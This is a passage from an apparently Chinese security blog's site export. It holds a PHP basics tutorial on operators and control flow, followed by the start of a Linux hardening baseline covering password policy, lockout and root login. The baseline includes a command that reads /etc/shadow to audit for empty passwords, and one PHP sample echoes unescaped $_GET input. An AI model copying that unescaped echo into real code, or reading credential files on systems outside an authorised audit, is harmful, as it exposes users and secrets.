class="comment">// 减   2</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span> * <span class="variable">$b</span>;   <span class="comment">// 乘  24</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span> / <span class="variable">$b</span>;   <span class="comment">// 除  1.5</span></span><br><span class="line">     </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span> % <span class="variable">$b</span>;   <span class="comment">// 求模取余数  2    余数的符号和被除数一致</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="递增-x2F-递减运算符"><a href="#递增-x2F-递减运算符" class="headerlink" title="递增&#x2F;递减运算符"></a>递增&#x2F;递减运算符</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//自增运算    $a++    ++$a(不重要)</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line"><span class="variable">$a</span>++;       <span class="comment">// 相当于 $a = $a + 1;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;    <span class="comment">// 6</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>++;  <span class="comment">// 5  相当于 1) echo $a;  2) $a=$a+1;  先取值, 再自加</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">echo</span> ++<span class="variable">$a</span>;  <span class="comment">// 6  相当于 1) $a=$a+1;  2) echo $a;  先自加, 再取值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//自减运算    $a--   --$a(不重要)</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line"><span class="variable">$a</span>--;         <span class="comment">// 相当于 $a = $a - 1;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;      <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>--;    <span class="comment">// 5  相当于 1) echo $a;   2) $a=$a-1;  先取值, 再自减</span></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">echo</span> --<span class="variable">$a</span>;    <span class="comment">// 4  相当于 1) $a=$a-1    2) echo $a;  先自减, 再取值</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>对于布尔型变量, 自增自减都是原来的值</strong></p><p><strong>单个字符时, 会变成下一个字符</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>; </span><br><span class="line"><span class="variable">$a</span>++; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">// &#x27;b&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">5</span>;       <span class="comment">//把 5 赋值给 $a</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> += <span class="number">5</span>;     <span class="comment">//相当于   $a = $a + 5;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> -= <span class="number">5</span>;      <span class="comment">//相当于   $a = $a - 5;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> *= <span class="number">5</span>;     <span class="comment">//相当于   $a = $a * 5;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> /= <span class="number">5</span>;      <span class="comment">//相当于   $a = $a / 5;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> %= <span class="number">5</span>;    <span class="comment">//相当于    $a = $a % 5;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> .= <span class="string">&#x27;def&#x27;</span>;   <span class="comment">//相当于  $a = $a.&#x27;def&#x27;;      //abcdef</span></span><br></pre></td></tr></table></figure><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>最后结果为布尔型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;     大于</span><br><span class="line"></span><br><span class="line">&lt;     小于</span><br><span class="line"></span><br><span class="line">&gt;=    大于等于</span><br><span class="line"></span><br><span class="line">&lt;=    小于等于</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">==   用来判断是否相等.   值相等就可以</span><br><span class="line"></span><br><span class="line">===  用来判断是否全等,  要求类型相等, 值也要相等.  二者缺一不可</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!=     不等于</span><br><span class="line"></span><br><span class="line">!==    不全等于.  值不相等, 或者类型不相等</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>最后结果为布尔型</p><p><code>&amp;&amp;</code>(and)   逻辑与   符号两边<strong>同时为 true</strong>   结果就为true,  否则为 false</p><p><code>||</code>(or)   逻辑或   符号两边<strong>只要一边为 true</strong> 结果就为 true.   仅当两边同时为 false 时, 结果才为 false  </p><p><code>!</code>     逻辑非   将值取反,  原来的 true 变成 false   ,原来的 false 变成 true  </p><p><code>xor</code>  逻辑异或  符号两边不相同的时候为 true    两边相同的时候为false  $a &#x3D; (true xor true);</p><p><strong>短路</strong></p><p>或短路   当 || 左边的表达式为真时, 结果肯定为真, 所以 || 右边的表达式就不执行了     </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$a</span>&lt;<span class="number">6</span> || (<span class="variable">$b</span>=<span class="number">7</span>);</span><br><span class="line">       </span><br><span class="line">    <span class="comment">// $a&lt;6 为真, 就代表着 等号右边一定为真, $b=7 就不会被执行     这称为 逻辑或短路</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>与短路   当 &amp;&amp; 左边的表达式为假时, 结果肯定为假, 所以 &amp;&amp; 后边的表达式就不执行了   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$a</span>&gt;<span class="number">6</span> &amp;&amp; (<span class="variable">$b</span>=<span class="number">7</span>);</span><br><span class="line">       </span><br><span class="line">    <span class="comment">// $a&gt;6 为假, 就代表着 等号右边肯定为假, $b=7 就不会被执行     这称为 逻辑与短路</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h2><p>$a &#x3D; 表达式1 ?  表达式2 : 表达式3；</p><p>表达式1为真时，把表达式2的值赋值给$a;</p><p>表达式1为假时，把表达式3的值赋值给$a;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$test</span> = <span class="string">&#x27;必火网络安全&#x27;</span>;</span><br><span class="line">    <span class="comment">// 普通写法</span></span><br><span class="line">    <span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$test</span>) ? <span class="variable">$test</span> : <span class="string">&#x27;nobody&#x27;</span>;</span><br><span class="line">    <span class="comment">// 实例写法</span></span><br><span class="line">    <span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] : <span class="string">&#x27;nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h2><p><code>@</code>    错误抑制符      在发生错误的代码前加上@, 页面上就不会显示错误信息了</p><p><code>``</code>   执行命令符    ` 系统自带命令 &#96;;    通过这种形式可以执行系统自带的命令 </p><h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><p>根据代码的执行顺序不同，可以划分为顺序结构、分支结构、循环结构</p><h2 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h2><p>默认情况下，程序代码都是从上往下一条接着一条执行的，成为顺序结构。</p><h2 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h2><h3 id="单分支结构"><a href="#单分支结构" class="headerlink" title="单分支结构"></a>单分支结构</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>&lt;<span class="number">7</span>)&#123;</span><br><span class="line">        <span class="comment">//如果$a&lt;7成立，则执行这里的代码</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//后面的代码总会被执行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="双分支结构"><a href="#双分支结构" class="headerlink" title="双分支结构"></a>双分支结构</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">        <span class="comment">//条件为真，执行这里的代码</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//条件为假，执行这里的代码</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//二选一，总有一个条件会被执行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="多分支结构1if-else-if"><a href="#多分支结构1if-else-if" class="headerlink" title="多分支结构1if-else if"></a>多分支结构1if-else if</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(条件<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//条件1为真，执行这里</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="comment">//条件2为真，执行这里</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="comment">//条件3为真，执行这里</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//上面条件全部为假，执行这里</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="多分支结构2switch-…case"><a href="#多分支结构2switch-…case" class="headerlink" title="多分支结构2switch()…case"></a>多分支结构2switch()…case</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">switch</span>(条件)&#123;</span><br><span class="line">        <span class="keyword">case</span> 值<span class="number">1</span>:</span><br><span class="line">            <span class="comment">//要执行的语句</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> 值<span class="number">2</span>:</span><br><span class="line">            <span class="comment">//要执行的语句</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> 值<span class="number">3</span>:</span><br><span class="line">            <span class="comment">//要执行的语句</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">//没有匹配到的时候执行这里;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    1) 表达式的值 与 case后面的值做匹配, 匹配到哪个值就执行哪个值后面的语句;</span></span><br><span class="line"><span class="comment">    2) 如果匹配到了值1, 执行后面的代码, break中止执行,跳出多分去结构,执行后续语句</span></span><br><span class="line"><span class="comment">    3) 如果没匹配到, 执行 default 后的语句做为默认值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">for</span>(初始条件;判断条件;改变条件变量)&#123;</span><br><span class="line">        <span class="comment">//要重复执行的代码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//例如</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">10</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//执行完for循环之后在继续执行后面的代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;<span class="comment">//初始条件</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> &lt; <span class="number">10</span>)&#123;<span class="comment">//判断条件</span></span><br><span class="line">        <span class="comment">//重复执行的代码</span></span><br><span class="line">        <span class="variable">$i</span>++;<span class="comment">//改变条件变量</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h3><p>代码至少执行一次</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;<span class="comment">//初始条件</span></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="comment">//需要重复执行的代码</span></span><br><span class="line">        <span class="variable">$i</span>++;<span class="comment">//改变条件变量</span></span><br><span class="line">    &#125;<span class="keyword">while</span>(<span class="variable">$i</span>&lt;<span class="number">10</span>);<span class="comment">//判断条件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="break结束整个循环"><a href="#break结束整个循环" class="headerlink" title="break结束整个循环"></a>break结束整个循环</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>==<span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;<span class="comment">//当$i等于5时，停止循环，跳出循环，继续执行循环外的代码</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//循环里的其他代码</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//循环外的其他代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="continue结束一次循环"><a href="#continue结束一次循环" class="headerlink" title="continue结束一次循环"></a>continue结束一次循环</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>==<span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;<span class="comment">//当$i=5时，结束这次循环，不执行后面的代码，然后从</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//需要重复执行的代码，会因为continue而少执行一次</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="小结尾"><a href="#小结尾" class="headerlink" title="小结尾"></a>小结尾</h1><p>一门编程语言的内容实在是太多了，所以分成了四个部分，详情如下：</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP">第一部分</a>：基本语法、数据类型、PHP运算符、流程控制</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP2/">第二部分</a>：函数、数组、正则</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP3/">第三部分</a>：错误控制、时间戳、文件处理、文件上传、会话控制</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP类和对象/">第四部分</a>：PHP的类和对象</p>]]></content>
      
      
      <categories>
          
          <category> 编程代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux安全基线手册</title>
      <link href="/2022/09/10/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%E6%89%8B%E5%86%8C/"/>
      <url>/2022/09/10/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h2 id="第二章：账号管理、认证授权"><a href="#第二章：账号管理、认证授权" class="headerlink" title="第二章：账号管理、认证授权"></a>第二章：账号管理、认证授权</h2><h3 id="2-1账号"><a href="#2-1账号" class="headerlink" title="2.1账号"></a>2.1账号</h3><h4 id="2-11用户口令设置"><a href="#2-11用户口令设置" class="headerlink" title="2.11用户口令设置"></a>2.11用户口令设置</h4><h5 id="安全基线项目名称："><a href="#安全基线项目名称：" class="headerlink" title="安全基线项目名称："></a>安全基线项目名称：</h5><p>操作系统 Linux 用户口令设置安全基线要求项</p><h5 id="安全基线项说明："><a href="#安全基线项说明：" class="headerlink" title="安全基线项说明："></a>安全基线项说明：</h5><p>对于采用静态口令认证技术的设备，帐户口令的生存期不长于 90 天。</p><h5 id="检测操作步骤"><a href="#检测操作步骤" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、询问管理员是否存在如下类似的简单用户密码配置，比如：root/root, test/test, root/root1234</span><br><span class="line">2、执行：more /etc/login.defs，检查 PASS_MAX_DAYS/ PASS_MIN_DAYS/ PASS_WARN_AGE 参数</span><br><span class="line">3、执行：awk -F: &#x27;($2 == &quot;&quot;) &#123; print $1 &#125;&#x27; /etc/shadow, 检查是否存在空口令帐</span><br><span class="line">号</span><br></pre></td></tr></table></figure><h5 id="基线符合性判定依据"><a href="#基线符合性判定依据" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">建议在/etc/login.defs 文件中配置：</span><br><span class="line">PASS_MAX_DAYS 90 #新建用户的密码最长使用天数</span><br><span class="line">PASS_MIN_DAYS 0 #新建用户的密码最短使用天数</span><br><span class="line">PASS_WARN_AGE 7 #新建用户的密码到期提前提醒天数</span><br><span class="line">不存在空口令帐号</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h5><p><img src="/image/image-20220728192843063.png" alt="image-20220728192843063"></p><h4 id="2-1-2用户口令强度要求"><a href="#2-1-2用户口令强度要求" class="headerlink" title="2.1.2用户口令强度要求"></a>2.1.2用户口令强度要求</h4><h5 id="安全基线项目名称"><a href="#安全基线项目名称" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 用户口令强度安全基线要求项</p><h5 id="安全基线项说明"><a href="#安全基线项说明" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>对于采用静态口令认证技术的设备，口令长度至少 8 位，并包括数字、小写字母、大写字母和特殊符号 4 类中至少 2 类。</p><h5 id="检测操作步骤-1"><a href="#检测操作步骤-1" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>&#x2F;etc&#x2F;pam.d&#x2F;system-auth 文件中是否对 pam_cracklib.so 的参数进行了正确设置。</p><h5 id="基线符合性判定依据-1"><a href="#基线符合性判定依据-1" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>建议在&#x2F;etc&#x2F;pam.d&#x2F;system-auth 文件中配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password requisite pam_cracklib.so difok=3 minlen=8 ucredit=-1 lcredit=-1 dcredit=1 </span><br></pre></td></tr></table></figure><p>至少 8 位，包含一位大写字母，一位小写字母和一位数字</p><h5 id="备注-1"><a href="#备注-1" class="headerlink" title="备注"></a>备注</h5><h4 id="2-1-3用户锁定策略"><a href="#2-1-3用户锁定策略" class="headerlink" title="2.1.3用户锁定策略"></a>2.1.3用户锁定策略</h4><h5 id="安全基线项目名称-1"><a href="#安全基线项目名称-1" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 用户口令锁定策略安全基线要求项</p><h5 id="安全基线项说明-1"><a href="#安全基线项说明-1" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>对于采用静态口令认证技术的设备，应配置当用户连续认证失败次数超过 10 次，锁定该用户使用的帐号。</p><h5 id="检测操作步骤-2"><a href="#检测操作步骤-2" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>&#x2F;etc&#x2F;pam.d&#x2F;system-auth 文件中是否对 pam_tally.so 的参数进行了正确设置。</p><h5 id="基线符合性判定依据-2"><a href="#基线符合性判定依据-2" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">设置连续输错 3 次密码，帐号锁定 30s，使用命令“vi /etc/pam.d/ system-auth”修改配置文件，添加</span><br><span class="line"></span><br><span class="line">auth required pam_tally.so onerr=fail deny=3 unlock_time=30</span><br><span class="line"></span><br><span class="line">注：解锁用户 faillog -u &lt;用户名&gt; -r</span><br></pre></td></tr></table></figure><h5 id="备注-2"><a href="#备注-2" class="headerlink" title="备注"></a>备注</h5><h4 id="2-1-4root-用户远程登录限制"><a href="#2-1-4root-用户远程登录限制" class="headerlink" title="2.1.4root 用户远程登录限制"></a>2.1.4root 用户远程登录限制</h4><h5 id="安全基线项目名称-2"><a href="#安全基线项目名称-2" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 远程登录安全基线要求项</p><h5 id="安全基线项说明-2"><a href="#安全基线项说明-2" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>帐号与口令-root 用户远程登录限制</p><h5 id="检测操作步骤-3"><a href="#检测操作步骤-3" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>执行：more &#x2F;etc&#x2F;securetty，检查 Console 参数</p><h5 id="基线符合性判定依据-3"><a href="#基线符合性判定依据-3" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>建议在&#x2F;etc&#x2F;securetty 文件中配置：CONSOLE &#x3D; &#x2F;dev&#x2F;tty01</p><h5 id="备注-3"><a href="#备注-3" class="headerlink" title="备注"></a>备注</h5><p>会禁用本地登陆，<strong>危</strong>！</p><h4 id="2-1-5检查是否存在除-root-之外-UID-为-0-的用户"><a href="#2-1-5检查是否存在除-root-之外-UID-为-0-的用户" class="headerlink" title="2.1.5检查是否存在除 root 之外 UID 为 0 的用户"></a>2.1.5检查是否存在除 root 之外 UID 为 0 的用户</h4><h5 id="安全基线项目名称-3"><a href="#安全基线项目名称-3" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 超级用户策略安全基线要求项</p><h5 id="安全基线项说明-3"><a 